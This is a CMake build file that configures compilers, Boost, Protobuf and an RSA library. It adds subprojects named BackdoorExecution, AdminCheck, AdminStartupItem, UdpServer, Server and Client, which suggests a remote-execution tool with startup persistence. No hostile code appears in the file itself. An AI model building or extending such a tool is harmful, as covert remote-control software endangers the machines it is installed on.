cmake_minimum_required(VERSION 3.21)

set(CMAKE_VERBOSE_MAKEFILE ON)

project(cmake_hello_world LANGUAGES C CXX)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED True)

set(CMAKE_CXX_EXTENSIONS False) # Use -std=c++14 instead of -std=gnu++14

if (CMAKE_CXX_COMPILER_ID MATCHES MSVC)
    add_compile_definitions(UNICODE _UNICODE)

    # https://stackoverflow.com/a/56490614
    if (CMAKE_BUILD_TYPE STREQUAL "Release")
        set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded") # Instead of MultiThreadedReleaseDLL
    elseif (CMAKE_BUILD_TYPE STREQUAL "Debug")
        set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreadedDebug") # Instead of MultiThreadedDebugDLL
    else()
        message(FATAL_ERROR "Must be either Debug or Release")
    endif()

    if (CMAKE_BUILD_TYPE STREQUAL "Release")
        # Visual Studio performance profiler for Release builds
        # add_link_options("/PROFILE")
        # add_compile_options("/Z7")
    endif()
elseif (CMAKE_CXX_COMPILER_ID MATCHES GNU)
    add_compile_options(-Wall)
 
    # add_compile_options(-ftest-coverage -fprofile-arcs) # gcov

    # MinGW
    if (CMAKE_SYSTEM_NAME STREQUAL "Windows")
        add_link_options(-static -static-libgcc -static-libstdc++)
    elseif (CMAKE_SYSTEM_NAME STREQUAL "Linux")
        # ./valgrind --leak-check=full --show-leak-kinds=all --track-origins=yes --verbose --log-file=output_file.txt ./executable_name
        # add_compile_options(-ggdb3 -fno-omit-frame-pointer) # g++ Linux valgrind
        # add_compile_options(-gdwarf-5 -fno-omit-frame-pointer) # clang++ Linux valgrind
    else()
        message(FATAL_ERROR "Not Windows or Linux")
    endif()

endif()

set(Boost_INCLUDE_DIR "C:/boost_1_80_0")

set(Boost_USE_STATIC_LIBS ON) 
set(Boost_USE_MULTITHREADED ON)

if (CMAKE_SYSTEM_NAME STREQUAL "Windows")
    set(Boost_USE_STATIC_RUNTIME ON)
else()
    set(Boost_USE_STATIC_RUNTIME OFF)
endif()

set(Boost_USE_STATIC_RUNTIME ON)
# Download from:
# https://www.boost.org/users/download/
# https://boostorg.jfrog.io/artifactory/main/release/1.81.0/source/boost_1_81_0.7z
find_package(Boost REQUIRED) #COMPONENTS filesystem regex
# link_libraries(${Boost_LIBRARIES})
message(STATUS "list of Boost_LIBRARIES that are not header-only: { ${Boost_LIBRARIES} }")
message(STATUS "Boost_INCLUDE_DIRS: { ${Boost_INCLUDE_DIRS} }")
include_directories(${Boost_INCLUDE_DIRS})

set(Protobuf_ROOT_DIR "${CMAKE_SOURCE_DIR}/libs/protobuf-3.21.12")

if (CMAKE_BUILD_TYPE STREQUAL "Release")
    set(Protobuf_LIBRARIES_PATH "${Protobuf_ROOT_DIR}/build/Release")
    set(Protobuf_LIBRARY_NAME "libprotobuf")
elseif (CMAKE_BUILD_TYPE STREQUAL "Debug")
    set(Protobuf_LIBRARIES_PATH "${Protobuf_ROOT_DIR}/build/Debug")
    set(Protobuf_LIBRARY_NAME "libprotobufd")
else()
    message(FATAL_ERROR "Must be either Debug or Release")
endif()

set(Protobuf_LIBRARY "${Protobuf_LIBRARIES_PATH}/${Protobuf_LIBRARY_NAME}.lib")

set(Protobuf_INCLUDE_DIR "${Protobuf_ROOT_DIR}/src")
find_package(Protobuf REQUIRED)
include_directories(${Protobuf_INCLUDE_DIRS})

# Taken from https://github.com/BigBIueWhale/rsa_cpp
include_directories("libs/rsa_cpp")
add_subdirectory("libs/rsa_cpp/rsa_cpp")

include_directories(src/ProtoMessages)
add_subdirectory(src/ProtoMessages)
include_directories(src/SharedConstants)
add_subdirectory(src/SharedConstants)
include_directories(src/ErrorMessageMacro)
include_directories(src/Win32ErrorMessage)
add_subdirectory(src/Win32ErrorMessage)
include_directories(src/UdpServer)
add_subdirectory(src/UdpServer)
include_directories(src/BackdoorExecution)
add_subdirectory(src/BackdoorExecution)
include_directories(src/CombaseLibrary)
add_subdirectory(src/CombaseLibrary)
include_directories(src/PathToCurrentExecutable)
add_subdirectory(src/PathToCurrentExecutable)
include_directories(src/AdminCheck)
add_subdirectory(src/AdminCheck)
include_directories(src/AdminStartupItem)
add_subdirectory(src/AdminStartupItem)
add_subdirectory(src/Server)
add_subdirectory(src/Client)
